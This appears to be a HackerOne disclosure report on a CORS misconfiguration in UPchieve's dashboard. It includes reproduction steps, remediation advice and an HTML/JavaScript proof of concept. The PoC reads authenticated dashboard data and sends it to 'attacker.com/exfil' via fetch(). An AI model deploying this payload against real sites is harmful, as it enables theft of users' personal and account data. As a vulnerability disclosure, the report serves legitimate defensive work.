# Title: CORS Misconfiguration on UPchieve Dashboard

- **Platform**: HackerOne
- **Program**: UPchieve
- **Severity**: Medium
- **Date**: May 17, 2021
- **Researcher**: riski0912
- **Bounty**: N/A

## Summary
A CORS misconfiguration was found on `app.upchieve.org` where the `Access-Control-Allow-Origin` header reflected arbitrary origins with `Access-Control-Allow-Credentials: true`, allowing cross-origin theft of sensitive dashboard data.

## Technical Details
The UPchieve application's dashboard endpoint at `/dashboard` reflected the `Origin` header value in its CORS response. With credentials enabled, this meant any malicious website could make authenticated requests to UPchieve's dashboard and read the response, potentially accessing sensitive user information.

## Steps to Reproduce
1. Send a GET request to `https://app.upchieve.org/dashboard` with a custom Origin header
2. Observe the response includes `Access-Control-Allow-Origin: <custom_origin>`
3. Create a PoC HTML page that fetches dashboard data cross-origin

## Proof of Concept
```
Request:
GET /dashboard HTTP/1.1
Host: app.upchieve.org
Origin: https://yiopwxxzxvtf.com
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0

Response:
HTTP/1.1 200 OK
access-control-allow-origin: https://yiopwxxzxvtf.com
access-control-allow-credentials: true
set-cookie: connect.sid=s%3A...

Exploit PoC:
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', 'https://app.upchieve.org/dashboard', true);
xhr.onload = function() {
  fetch('https://attacker.com/exfil?d=' + btoa(xhr.responseText));
};
xhr.send();
</script>
</body>
</html>
```

## Impact
An attacker could steal authenticated session data from logged-in UPchieve users, including personal information, educational data, and account details. The cookie `connect.sid` would be sent automatically with credentials.

## Remediation
Whitelist specific, trusted origins instead of reflecting arbitrary origins. If the Express.js `cors` package is used, configure it with an explicit allowlist. Remove `Access-Control-Allow-Credentials: true` or restrict it to specific origins.

## References
- https://hackerone.com/reports/1199527
